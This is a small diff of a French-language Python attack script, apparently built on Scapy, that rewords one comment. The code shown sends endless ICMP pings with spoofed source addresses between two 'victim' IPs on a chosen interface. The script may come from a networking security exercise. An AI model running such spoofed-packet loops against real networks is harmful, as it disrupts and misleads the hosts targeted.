@@ -179,7 +179,7 @@ ip_victime2 = contenu[2]
 # Nom de l'interface réseau sur laquelle l'attaque est effectué
 iface = contenu[6]
 
-# Envoie à victime1 en tant que victime2 et inversement
+# Envoie des pings à victime1 en tant que victime2 et inversement
 while True:
     send(IP(src=ip_victime1, dst=ip_victime2)/ICMP(), iface=iface)
     send(IP(src=ip_victime2, dst=ip_victime1)/ICMP(), iface=iface)
